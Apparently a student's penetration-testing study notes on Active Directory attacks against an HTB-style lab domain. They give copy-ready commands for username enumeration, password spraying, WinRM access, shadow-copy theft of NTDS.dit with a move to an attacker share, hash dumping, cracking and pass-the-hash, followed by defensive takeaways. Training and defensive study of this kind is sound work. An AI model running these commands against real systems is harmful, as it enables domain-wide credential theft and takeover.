
> [!info] **Core Concept**  
> Active Directory (AD) is the central identity and access management system in most Windows enterprise environments.  
> If an organization uses Windows at scale, it almost certainly uses AD to manage:

- Users
    
- Computers
    
- Authentication
    
- Authorization
    
- Group policies
    
- Domain-wide access control
    

Because of this, **AD is one of the highest-value targets during internal penetration testing**.

---

# Why AD Matters in Attacks

Once a system is **domain joined**, authentication changes:

### Local Authentication

Uses:

- **SAM database**
    
    - Stores local account credentials
        

Example:

```cmd
WS01\localuser
```

or

```cmd
.\localuser
```

---

### Domain Authentication

Uses:

- Domain Controller (DC)
    
- Kerberos / NTLM validation
    
- LSASS processing
    

Flow:

```text
User → Workstation → Domain Controller → Authentication validation
```

This means:

> Compromising the Domain Controller often means compromising the **entire domain**.

---

# Authentication Components to Know

## LSASS

Handles authentication requests locally.

Responsible for:

- Credential processing
    
- Ticket management
    
- Security token generation
    

---

## NTLM

Legacy challenge-response authentication protocol.

Used when:

- Kerberos is unavailable
    
- Older systems are involved
    

Weakness:

- Vulnerable to **Pass-the-Hash (PtH)**
    

---

## Kerberos

Primary modern AD authentication protocol.

Uses:

- Ticket Granting Tickets (TGTs)
    
- Key Distribution Center (KDC)
    

Benefits:

- Stronger than NTLM
    
- Enables mutual authentication
    

---

# Attack Path Overview

Typical attack chain:

```text
Initial foothold
   ↓
Enumerate usernames
   ↓
Dictionary attack / Password spraying
   ↓
Gain valid credentials
   ↓
Remote access to Domain Controller
   ↓
Extract NTDS.dit + SYSTEM
   ↓
Dump hashes
   ↓
Crack or Pass-the-Hash
   ↓
Full domain compromise
```

---

# Phase 1 — Dictionary Attacks Against AD Accounts

## What is a Dictionary Attack?

A dictionary attack uses predefined username/password lists to attempt authentication.

---

## Risks

These attacks are **noisy** because they:

- Generate authentication logs
    
- Trigger SIEM alerts
    
- Can cause account lockouts
    

---

# Building Username Lists

## Common Naming Conventions

|Convention|Example (Jane Jill Doe)|
|---|---|
|firstinitiallastname|jdoe|
|firstinitialmiddleinitiallastname|jjdoe|
|firstnamelastname|janedoe|
|firstname.lastname|jane.doe|
|lastname.firstname|doe.jane|
|nickname|doedoehacksstuff|

---

## OSINT Sources

Gather names from:

- Company websites
    
- Employee directories
    
- PDFs metadata
    
- Public documents
    
- Social platforms
    

Google dork example:

```text
"company.com filetype:pdf"
```

Email example:

```text
jdoe@company.com
```

Infer:

```text
Username = jdoe
```

---

# Creating Username Lists

Example:

```txt
bwilliamson
benwilliamson
ben.williamson
williamson.ben
jdoe
jane.doe
```

---

## Automated Generation

Useful tool:

Username Anarchy

Example:

```bash
./username-anarchy -i names.txt
```

Purpose:

Generate many possible naming formats automatically.

---

# Phase 2 — Enumerating Valid Users

Tool:

Kerbrute

Command:

```bash
./kerbrute_linux_amd64 userenum \
--dc 10.129.201.57 \
--domain inlanefreight.local \
names.txt
```

Valid output:

```text
[+] VALID USERNAME: bwilliamson@inlanefreight.local
```

---

## Why Enumerate First?

Without enumeration:

You waste time spraying invalid accounts.

With enumeration:

You attack only confirmed usernames.

More efficient  
Less noisy

---

# Phase 3 — Password Attacks with NetExec

Tool:

NetExec

Example:

```bash
netexec smb 10.129.201.57 \
-u bwilliamson \
-p /usr/share/wordlists/fasttrack.txt
```

Successful result:

```text
[+] inlanefreight.local\bwilliamson:P@55w0rd!
```

---

## What Happens Internally?

NetExec:

1. Connects over SMB (445)
    
2. Sends auth requests
    
3. Tests passwords
    
4. Reports success/failure
    

---

## Operational Warning

Account lockout policies can cause:

- Detection
    
- User disruption
    
- Blue-team alerting
    

Always verify:

```text
Domain password policy
```

before aggressive spraying.

---

# Windows Logging Evidence

These attacks leave traces.

Primary event:

**Event ID 4776**

Indicates:

Credential validation attempts.

Blue teams can correlate:

- Failed logons
    
- Source IP
    
- Username targets
    

---

# Phase 4 — Remote Access

After valid credentials:

Tool:

Evil-WinRM

Connect:

```bash
evil-winrm -i 10.129.201.57 \
-u bwilliamson \
-p 'P@55w0rd!'
```

This provides:

Interactive PowerShell access.

---

# Phase 5 — Privilege Validation

Check local groups:

```powershell
net localgroup
```

Check user privileges:

```powershell
net user bwilliamson
```

You need:

- Local Administrator  
    or
    
- Domain Admin
    

To dump NTDS.

---

# Phase 6 — Capturing NTDS.dit

## What is NTDS.dit?

> [!danger] High-value target

NTDS.dit stores:

- Domain usernames
    
- NT hashes
    
- Kerberos keys
    
- AD objects
    
- Schema data
    

Default location:

```text
%systemroot%\NTDS\
```

Compromise it → compromise the domain.

---

# Using Volume Shadow Copy

Create snapshot:

```powershell
vssadmin CREATE SHADOW /For=C:
```

Why?

The file is normally locked.

VSS creates a readable snapshot.

---

## Copy NTDS

```powershell
cmd.exe /c copy \
\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit \
c:\NTDS\NTDS.dit
```

---

## Important

You also need:

```text
SYSTEM
```

Because:

NTDS hashes are encrypted using the SYSTEM bootkey.

---

# Transfer Files

Move to attacker host:

```powershell
cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData
```

---

# Phase 7 — Dumping Hashes

Tool:

Impacket SecretsDump

Command:

```bash
impacket-secretsdump \
-ntds NTDS.dit \
-system SYSTEM LOCAL
```

Output:

```text
Administrator:500:<LM>:<NT>
krbtgt:502:<LM>:<NT>
```

---

# Faster Method — NetExec NTDS Module

One-step dump:

```bash
netexec smb 10.129.201.57 \
-u bwilliamson \
-p P@55w0rd! \
-M ntdsutil
```

This automates:

- Shadow copy creation
    
- Extraction
    
- Transfer
    
- Hash dumping
    
- Cleanup
    

Much faster during ops.

---

# Phase 8 — Cracking Hashes

Tool:

Hashcat

Example:

```bash
hashcat -m 1000 hash.txt rockyou.txt
```

NTLM mode:

```text
-m 1000
```

Result:

```text
64f12...:Password1
```

---

# If Cracking Fails → Pass-the-Hash

## Pass-the-Hash (PtH)

Uses:

```text
username + NT hash
```

Instead of:

```text
username + plaintext password
```

Example:

```bash
evil-winrm -i 10.129.201.57 \
-u Administrator \
-H 64f12cddaa88057e06a81b54e73b949b
```

Why it works:

NTLM Authentication accepts the hash as proof.

No password cracking needed.

---

# Defensive Takeaways

Organizations should:

## Enforce Strong Lockout Policies

Prevent brute-force success.

---

## Monitor Event ID 4776

Detect spraying activity.

---

## Restrict WinRM / SMB Access

Reduce lateral movement paths.

---

## Limit Domain Admin Membership

Least privilege.

---

## Protect Domain Controllers

DC compromise = forest compromise.

---

## Monitor VSS Usage

Unexpected shadow copies are suspicious.

---

## Credential Hygiene

Prevent password reuse and weak passwords.

---

# Exam / HTB Key Memory Anchors

> [!tip] Memorize this chain

### Username Discovery

- OSINT
    
- Email patterns
    
- Username Anarchy
    

### Validation

- Kerbrute
    

### Password Attack

- NetExec SMB
    

### Remote Access

- Evil-WinRM
    

### Extraction

- VSS + NTDS.dit + SYSTEM
    

### Dumping

- SecretsDump / NetExec ntdsutil
    

### Credential Use

- Hashcat
    
- Pass-the-Hash
    

---

# Mental Model

Think of AD compromise as:

```text
Enumerate → Authenticate → Escalate → Extract → Crack/Reuse → Own Domain
```

That sequence shows the full attack lifecycle.